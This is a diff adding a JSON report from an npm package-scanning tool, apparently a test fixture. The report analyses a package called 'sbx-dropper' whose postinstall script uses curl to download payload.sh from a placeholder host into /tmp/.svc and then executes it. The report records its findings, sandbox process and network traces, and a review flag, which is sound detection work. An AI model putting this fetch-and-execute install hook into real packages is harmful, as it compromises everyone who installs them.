@@ -1,0 +1,544 @@
+{
+  "package": {
+    "ecosystem": "npm",
+    "name": "sbx-dropper",
+    "version": "1.0.0"
+  },
+  "analyzerVersion": "0.1.0",
+  "generatedAt": "2026-09-18T20:40:21.828970Z",
+  "findings": [
+    {
+      "ruleId": "metadata.install_script",
+      "layer": "metadata",
+      "severity": "MEDIUM",
+      "confidence": "HIGH",
+      "title": "Runs a 'postinstall' script during install",
+      "file": "package.json",
+      "line": null,
+      "snippet": "curl -s http://cdn.example.invalid/payload.sh -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc",
+      "installTime": false,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "sandbox.dropper_exec",
+      "layer": "sandbox",
+      "severity": "HIGH",
+      "confidence": "MEDIUM",
+      "title": "Runs a file it just created after contacting an outside host (dropper pattern)",
+      "file": "/tmp/.svc",
+      "line": null,
+      "snippet": null,
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "sandbox.unexpected_network",
+      "layer": "sandbox",
+      "severity": "LOW",
+      "confidence": "MEDIUM",
+      "title": "Contacts a host that is not the npm registry: cdn.example.invalid",
+      "file": "cdn.example.invalid",
+      "line": null,
+      "snippet": "http://cdn.example.invalid/payload.sh",
+      "installTime": true,
+      "occurrences": 1
+    },
+    {
+      "ruleId": "sandbox.suspicious_process",
+      "layer": "sandbox",
+      "severity": "MEDIUM",
+      "confidence": "MEDIUM",
+      "title": "Runs download / decode / shell tools",
+      "file": null,
+      "line": null,
+      "snippet": "shell: sh -c curl -s http://cdn.example.invalid/payload.sh -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc; curl: curl -s http://cdn.example.invalid/payload.sh -o /tmp/.svc",
+      "installTime": true,
+      "occurrences": 2
+    }
+  ],
+  "intel": {
+    "osv": {
+      "maliciousIds": [],
+      "vulnerabilityIds": []
+    },
+    "safedep": {
+      "found": false
+    }
+  },
+  "metadata": {
+    "description": null,
+    "license": null,
+    "publisher": "fixture-author",
+    "trustedPublishing": false,
+    "provenance": false,
+    "maintainers": [
+      "fixture-author"
+    ],
+    "publishedAt": "2026-03-02T20:40:21.797050+00:00",
+    "previousVersion": null,
+    "installScripts": {
+      "postinstall": "curl -s http://cdn.example.invalid/payload.sh -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc"
+    },
+    "repository": "git+https://example.invalid/sbx-dropper.git",
+    "dependencies": {},
+    "sha256": "635fcc7af5e7a6f3821c4c9c39d26678dc4feccef5ddb1168b938ab897c6ddfd",
+    "fileCount": 1,
+    "unpackedBytes": 177
+  },
+  "codeScan": {
+    "filesScanned": 0,
+    "filesParsed": 0,
+    "filesWithParseErrors": 0,
+    "installTimeFiles": [],
+    "entryFiles": [],
+    "executables": [],
+    "skipped": [],
+    "findingsTruncated": false
+  },
+  "aiReview": null,
+  "aiError": null,
+  "behavior": {
+    "networkModules": [],
+    "hosts": [],
+    "ipAddresses": [],
+    "envVars": [],
+    "readsAllEnv": false,
+    "sensitivePaths": [],
+    "runsCommands": false,
+    "dynamicCode": false,
+    "decodesData": false,
+    "readsMachineInfo": false,
+    "nativeExecutables": [],
+    "installTime": {
+      "network": false,
+      "commands": false,
+      "files": []
+    },
+    "filesByCapability": {}
+  },
+  "iocs": [],
+  "fileHashes": [
+    {
+      "path": "package.json",
+      "size": 177,
+      "sha256": "8c135d3257eecedf521fd21e19bd3adc39dba1f74d9c5499483bd168e570b1f9"
+    }
+  ],
+  "fileHashesTruncated": false,
+  "settings": {
+    "analyzerVersion": "0.1.0",
+    "rulesHash": "cdd49f6359d5",
+    "promptHashes": {},
+    "ai": {
+      "mode": "off"
+    },
+    "settingsHash": "c9edcfb6b502"
+  },
+  "timings": {
+    "downloadSeconds": 0.001,
+    "unpackSeconds": 0.004,
+    "intelSeconds": 0.002,
+    "metadataSeconds": 0.008,
+    "codeScanSeconds": 0.003,
+    "sandboxSeconds": 0.013,
+    "aiSeconds": 0.0,
+    "totalSeconds": 0.031
+  },
+  "reviewFlags": {
+    "rulesAiDisagree": false,
+    "workerCoordinatorDisagree": false,
+    "promptInjectionDetected": false,
+    "lowCoverage": false,
+    "aiFailed": false,
+    "needsHumanReview": true,
+    "reasons": [
+      "The final verdict is SUSPICIOUS."
+    ]
+  },
+  "codeIssues": [
+    {
+      "id": "issue-1",
+      "file": "package.json",
+      "lineStart": 4,
+      "lineEnd": 4,
+      "severity": "MEDIUM",
+      "category": "install_script",
+      "title": "Runs a 'postinstall' script during install",
+      "whyItMatters": "This command runs automatically during npm install, before any code is imported. Malware most often starts here.",
+      "analysis": null,
+      "sources": [
+        "rules"
+      ],
+      "ruleIds": [
+        "metadata.install_script"
+      ],
+      "aiAssessment": null,
+      "installTime": false,
+      "excerpt": {
+        "startLine": 1,
+        "endLine": 6,
+        "highlightStart": 4,
+        "highlightEnd": 4,
+        "lines": [
+          {
+            "number": 1,
+            "text": "{",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 2,
+            "text": "  \"name\": \"sbx-dropper\",",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 3,
+            "text": "  \"version\": \"1.0.0\",",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 4,
+            "text": "  \"scripts\": {\"postinstall\": \"curl -s http://cdn.example.invalid/payload.sh -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc\"}",
+            "highlighted": true,
+            "clipped": false
+          },
+          {
+            "number": 5,
+            "text": "}",
+            "highlighted": false,
+            "clipped": false
+          },
+          {
+            "number": 6,
+            "text": "",
+            "highlighted": false,
+            "clipped": false
+          }
+        ]
+      }
+    }
+  ],
+  "sandbox": {
+    "version": "0.1.0",
+    "status": "COMPLETE",
+    "skipReason": null,
+    "durationSeconds": 1.7,
+    "rawTraceS3Key": "sandbox-traces/npm/sbx-dropper/1.0.0/0.1.0.json",
+    "coverage": {
+      "installed": true,
+      "installScriptsRan": true,
+      "entryLoaded": false,
+      "entryError": "Cannot find module 'sbx-dropper'\nRequire stack:\n- /opt/sbx/loader.js",
+      "binsRun": 0,
+      "timedOut": false,
+      "dependenciesStripped": true
+    },
+    "runs": [
+      {
+        "name": "baseline",
+        "ci": false,
+        "clockOffsetDays": 0,
+        "hostname": "container",
+        "user": "sandbox",
+        "phases": [
+          {
+            "name": "install",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 1.55,
+            "cpuSeconds": 1.35
+          },
+          {
+            "name": "require",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 0.12,
+            "cpuSeconds": 0.1
+          }
+        ],
+        "notes": []
+      },
+      {
+        "name": "hostile",
+        "ci": true,
+        "clockOffsetDays": 60,
+        "hostname": "ci-runner-04",
+        "user": "runner",
+        "phases": [
+          {
+            "name": "install",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 1.21,
+            "cpuSeconds": 1.03
+          },
+          {
+            "name": "require",
+            "exitCode": 0,
+            "timedOut": false,
+            "seconds": 0.12,
+            "cpuSeconds": 0.09
+          }
+        ],
+        "notes": []
+      }
+    ],
+    "network": [
+      {
+        "run": "baseline",
+        "kind": "dns",
+        "classification": "unexpected",
+        "host": "cdn.example.invalid",
+        "ip": null,
+        "port": null,
+        "method": null,
+        "url": null,
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": null,
+        "count": 2
+      },
+      {
+        "run": "baseline",
+        "kind": "http",
+        "classification": "unexpected",
+        "host": "cdn.example.invalid",
+        "ip": null,
+        "port": 80,
+        "method": "GET",
+        "url": "http://cdn.example.invalid/payload.sh",
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": null,
+        "count": 1
+      },
+      {
+        "run": "baseline",
+        "kind": "connect",
+        "classification": "unexpected",
+        "host": "cdn.example.invalid",
+        "ip": "127.1.0.1",
+        "port": 80,
+        "method": null,
+        "url": null,
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": "install",
+        "count": 1
+      },
+      {
+        "run": "hostile",
+        "kind": "dns",
+        "classification": "unexpected",
+        "host": "cdn.example.invalid",
+        "ip": null,
+        "port": null,
+        "method": null,
+        "url": null,
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": null,
+        "count": 2
+      },
+      {
+        "run": "hostile",
+        "kind": "http",
+        "classification": "unexpected",
+        "host": "cdn.example.invalid",
+        "ip": null,
+        "port": 80,
+        "method": "GET",
+        "url": "http://cdn.example.invalid/payload.sh",
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": null,
+        "count": 1
+      },
+      {
+        "run": "hostile",
+        "kind": "connect",
+        "classification": "unexpected",
+        "host": "cdn.example.invalid",
+        "ip": "127.1.0.1",
+        "port": 80,
+        "method": null,
+        "url": null,
+        "bodyPreview": null,
+        "canaryHit": false,
+        "phase": "install",
+        "count": 1
+      }
+    ],
+    "processes": [
+      {
+        "run": "baseline",
+        "pid": 39,
+        "ppid": 28,
+        "exe": "/usr/bin/sh",
+        "argv": [
+          "sh",
+          "-c",
+          "curl -s http://cdn.example.invalid/payload.sh -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "baseline",
+        "pid": 40,
+        "ppid": 39,
+        "exe": "/usr/bin/curl",
+        "argv": [
+          "curl",
+          "-s",
+          "http://cdn.example.invalid/payload.sh",
+          "-o",
+          "/tmp/.svc"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "baseline",
+        "pid": 43,
+        "ppid": 39,
+        "exe": "/usr/bin/chmod",
+        "argv": [
+          "chmod",
+          "+x",
+          "/tmp/.svc"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "baseline",
+        "pid": 44,
+        "ppid": 39,
+        "exe": "/tmp/.svc",
+        "argv": [
+          "/tmp/.svc"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "hostile",
+        "pid": 39,
+        "ppid": 28,
+        "exe": "/usr/bin/sh",
+        "argv": [
+          "sh",
+          "-c",
+          "curl -s http://cdn.example.invalid/payload.sh -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "hostile",
+        "pid": 40,
+        "ppid": 39,
+        "exe": "/usr/bin/curl",
+        "argv": [
+          "curl",
+          "-s",
+          "http://cdn.example.invalid/payload.sh",
+          "-o",
+          "/tmp/.svc"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "hostile",
+        "pid": 43,
+        "ppid": 39,
+        "exe": "/usr/bin/chmod",
+        "argv": [
+          "chmod",
+          "+x",
+          "/tmp/.svc"
+        ],
+        "phase": "install"
+      },
+      {
+        "run": "hostile",
+        "pid": 44,
+        "ppid": 39,
+        "exe": "/tmp/.svc",
+        "argv": [
+          "/tmp/.svc"
+        ],
+        "phase": "install"
+      }
+    ],
+    "files": [
+      {
+        "run": "baseline",
+        "op": "added",
+        "path": "/tmp/.svc",
+        "decoy": false,
+        "category": null,
+        "executable": true,
+        "sha256": "306c6ca7407560340797866e077e053627ad409277d1b9da58106fce4cf717cb",
+        "preview": "#!/bin/sh\nexit 0\n",
+        "phase": null
+      },
+      {
+        "run": "hostile",
+        "op": "added",
+        "path": "/tmp/.svc",
+        "decoy": false,
+        "category": null,
+        "executable": true,
+        "sha256": "306c6ca7407560340797866e077e053627ad409277d1b9da58106fce4cf717cb",
+        "preview": "#!/bin/sh\nexit 0\n",
+        "phase": null
+      }
+    ],
+    "evalPayloads": [],
+    "canaryHits": [],
+    "conditional": [],
+    "resources": {
+      "peakCpuSeconds": 1.35,
+      "peakMemoryMb": 73.8,
+      "timedOutPhases": []
+    },
+    "findings": [
+      {
+        "ruleId": "sandbox.dropper_exec",
+        "layer": "sandbox",
+        "severity": "HIGH",
+        "confidence": "MEDIUM",
+        "title": "Runs a file it just created after contacting an outside host (dropper pattern)",
+        "file": "/tmp/.svc",
+        "line": null,
+        "snippet": null,
+        "installTime": true,
+        "occurrences": 1
+      },
+      {
+        "ruleId": "sandbox.unexpected_network",
+        "layer": "sandbox",
+        "severity": "LOW",
+        "confidence": "MEDIUM",
+        "title": "Contacts a host that is not the npm registry: cdn.example.invalid",
+        "file": "cdn.example.invalid",
+        "line": null,
+        "snippet": "http://cdn.example.invalid/payload.sh",
+        "installTime": true,
+        "occurrences": 1
+      },
+      {
+        "ruleId": "sandbox.suspicious_process",
+        "layer": "sandbox",
+        "severity": "MEDIUM",
+        "confidence": "MEDIUM",
+        "title": "Runs download / decode / shell tools",
+        "file": null,
+        "line": null,
+        "snippet": "shell: sh -c curl -s http://cdn.example.invalid/payload.sh -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc; curl: curl -s http://cdn.example.invalid/payload.sh -o /tmp/.svc",
+        "installTime": true,
+        "occurrences": 2
+      }
+    ]
+  },
+  "humanReview": null
+}
